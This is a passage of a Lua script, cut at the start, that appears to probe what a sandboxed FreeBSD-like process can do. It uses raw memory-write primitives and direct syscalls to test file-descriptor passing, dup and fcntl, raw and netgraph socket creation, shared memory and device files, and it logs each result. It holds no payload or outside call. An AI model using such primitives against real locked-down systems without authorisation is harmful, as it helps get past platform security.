for i = 0, 63, 8 do memory.write_qword(msghdr + i, 0) end
memory.write_qword(msghdr, 0)               -- msg_name = NULL
memory.write_dword(msghdr + 8, 0)           -- msg_namelen = 0
memory.write_qword(msghdr + 16, iov)        -- msg_iov
memory.write_qword(msghdr + 24, 1)          -- msg_iovlen = 1
memory.write_qword(msghdr + 32, cmsg_buf)   -- msg_control
memory.write_qword(msghdr + 40, 24)         -- msg_controllen = CMSG_SPACE(4)
memory.write_dword(msghdr + 48, 0)          -- msg_flags = 0

-- Send fd over pair1
local sm_ok, sm_ret = pcall(function() return syscall.sc_sendmsg(fd1a, msghdr, 0) end)
log("  sendmsg(SCM_RIGHTS): " ..
    (sm_ok and "rv=" .. sm_ret:tonumber() or "ERR"))

-- Receive on the other end
local recv_cmsg = memory.alloc(64)
local recv_iov_buf = memory.alloc(16)
local recv_iov = memory.alloc(16)
memory.write_qword(recv_iov, recv_iov_buf)
memory.write_qword(recv_iov + 8, 16)

local recv_hdr = memory.alloc(64)
for i = 0, 63, 8 do memory.write_qword(recv_hdr + i, 0) end
for i = 0, 63, 8 do memory.write_qword(recv_cmsg + i, 0) end
memory.write_qword(recv_hdr + 16, recv_iov)
memory.write_qword(recv_hdr + 24, 1)
memory.write_qword(recv_hdr + 32, recv_cmsg)
memory.write_qword(recv_hdr + 40, 64)

local rm_ok, rm_ret = pcall(function() return syscall.sc_recvmsg(fd1b, recv_hdr, 0) end)
if rm_ok then
    local received_fd = memory.read_dword(recv_cmsg + 16):tonumber()
    local cmsg_len = memory.read_dword(recv_cmsg):tonumber()
    local cmsg_level = memory.read_dword(recv_cmsg + 4):tonumber()
    local cmsg_type = memory.read_dword(recv_cmsg + 8):tonumber()
    log(string.format("  recvmsg: rv=%d cmsg_len=%d level=0x%x type=%d fd=%d",
        rm_ret:tonumber(), cmsg_len, cmsg_level, cmsg_type, received_fd))

    -- Test if the received fd works (write to it, read from its pair)
    if received_fd > 0 then
        local test_data = memory.alloc(8)
        memory.write_qword(test_data, 0xDEADBEEFCAFE1234)
        local wr_ok, wr_ret = pcall(function()
            return syscall.sc_write(received_fd, test_data, 8)
        end)
        log("  write to passed fd: " ..
            (wr_ok and "rv=" .. wr_ret:tonumber() or "ERR"))

        -- Read from fd2b (the other end of the passed fd's pair)
        local rd_buf = memory.alloc(8)
        local rd_ok, rd_ret = pcall(function()
            return syscall.sc_read(fd2b, rd_buf, 8)
        end)
        if rd_ok then
            local lo = memory.read_dword(rd_buf):tonumber()
            local hi = memory.read_dword(rd_buf + 4):tonumber()
            log(string.format("  read from pair: rv=%d data=0x%08x%08x",
                rd_ret:tonumber(), hi, lo))
        end
        pcall(function() syscall.sc_close(received_fd) end)
    end
else
    log("  recvmsg: ERR")
end

-- ============================================================
-- PART 3: dup2, fcntl, fstat
-- ============================================================
log("")
log("--- PART 3: fd operations ---")

-- dup
local dup_ok, dup_ret = pcall(function() return syscall.sc_dup(fd1a) end)
log("  dup(" .. fd1a .. "): " .. (dup_ok and "fd=" .. dup_ret:tonumber() or "ERR"))
if dup_ok then pcall(function() syscall.sc_close(dup_ret:tonumber()) end) end

-- dup2
local dup2_ok, dup2_ret = pcall(function() return syscall.sc_dup2(fd1a, 100) end)
log("  dup2(" .. fd1a .. ",100): " .. (dup2_ok and "rv=" .. dup2_ret:tonumber() or "ERR"))
if dup2_ok then pcall(function() syscall.sc_close(100) end) end

-- fcntl F_GETFL
local fcntl_ok, fcntl_ret = pcall(function() return syscall.sc_fcntl(fd1a, 3, 0) end) -- F_GETFL=3
log("  fcntl(GETFL): " .. (fcntl_ok and "flags=" .. fcntl_ret:tonumber() or "ERR"))

-- fcntl F_GETFD
local fcntl2_ok, fcntl2_ret = pcall(function() return syscall.sc_fcntl(fd1a, 1, 0) end) -- F_GETFD=1
log("  fcntl(GETFD): " .. (fcntl2_ok and "flags=" .. fcntl2_ret:tonumber() or "ERR"))

-- fstat
local stat_buf = memory.alloc(256)
local fstat_ok, fstat_ret = pcall(function() return syscall.sc_fstat(fd1a, stat_buf) end)
if fstat_ok then
    local dev = memory.read_dword(stat_buf):tonumber()
    local ino = memory.read_qword(stat_buf + 8):tonumber()
    local mode = memory.read_dword(stat_buf + 24):tonumber()
    log(string.format("  fstat: rv=%d dev=%d ino=%d mode=0x%x",
        fstat_ret:tonumber(), dev, ino, mode))
end

-- ============================================================
-- PART 4: Socket types
-- ============================================================
log("")
log("--- PART 4: socket types ---")

local sock_types = {
    {1, 1, 0, "AF_UNIX STREAM"},
    {1, 2, 0, "AF_UNIX DGRAM"},
    {2, 1, 0, "AF_INET STREAM"},
    {2, 2, 0, "AF_INET DGRAM"},
    {2, 3, 0, "AF_INET RAW"},
    {28, 1, 0, "AF_INET6 STREAM"},
    {28, 2, 0, "AF_INET6 DGRAM"},
    {28, 3, 0, "AF_INET6 RAW"},
    {18, 1, 0, "AF_LINK STREAM"},   -- link-layer
    {34, 2, 0, "AF_NETGRAPH DGRAM"}, -- netgraph
}

for _, st in ipairs(sock_types) do
    local s_ok, s_ret = pcall(function()
        return syscall.sc_socket(st[1], st[2], st[3])
    end)
    if s_ok then
        local fd = s_ret:tonumber()
        if fd >= 0 then
            log(string.format("  %-20s fd=%d", st[4], fd))
            pcall(function() syscall.sc_close(fd) end)
        else
            log(string.format("  %-20s rv=%d", st[4], fd))
        end
    else
        log(string.format("  %-20s ERR", st[4]))
    end
end

-- ============================================================
-- PART 5: shm_open, open special files
-- ============================================================
log("")
log("--- PART 5: shm + special files ---")

-- shm_open2 (FreeBSD 13+)
local shm_name = memory.alloc(32)
-- Write "/test_shm\0"
local name = "/test_shm"
for i = 1, #name do memory.write_byte(shm_name + i - 1, name:byte(i)) end
memory.write_byte(shm_name + #name, 0)

local shm_ok, shm_ret = pcall(function()
    return syscall.sc_shm_open2(shm_name, 0x0602, 0x1FF, 0, 0) -- O_RDWR|O_CREAT, 0777
end)
log("  shm_open2: " .. (shm_ok and "fd=" .. shm_ret:tonumber() or "ERR"))
if shm_ok and shm_ret:tonumber() >= 0 then
    pcall(function() syscall.sc_close(shm_ret:tonumber()) end)
    pcall(function() syscall.sc_shm_unlink(shm_name) end)
end

-- open /dev/null
local devnull = memory.alloc(16)
for i = 1, 9 do memory.write_byte(devnull + i - 1, ("/dev/null"):byte(i)) end
memory.write_byte(devnull + 9, 0)

local dn_ok, dn_ret = pcall(function() return syscall.sc_open(devnull, 2, 0) end) -- O_RDWR
log("  /dev/null: " .. (dn_ok and "fd=" .. dn_ret:tonumber() or "ERR"))
if dn_ok and dn_ret:tonumber() >= 0 then
    pcall(function() syscall.sc_close(dn_ret:tonumber()) end)
end

-- open /dev/zero
local devzero = memory.alloc(16)
for i = 1, 9 do memory.write_byte(devzero + i - 1, ("/dev/zero"):byte(i)) end
memory.write_byte(devzero + 9, 0)

local dz_ok, dz_ret = pcall(function() return syscall.sc_open(devzero, 0, 0) end) -- O_RDONLY
log("  /dev/zero: " .. (dz_ok and "fd=" .. dz_ret:tonumber() or "ERR"))
if dz_ok and dz_ret:tonumber() >= 0 then
    pcall(function() syscall.sc_close(dz_ret:tonumber()) end)
end

-- Cleanup
pcall(function() syscall.sc_close(fd1a) end)
pcall(function() syscall.sc_close(fd1b) end)
pcall(function() syscall.sc_close(fd2a) end)
pcall(function() syscall.sc_close(fd2b) end)

log("")
log("=== THREAD+FD DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
```
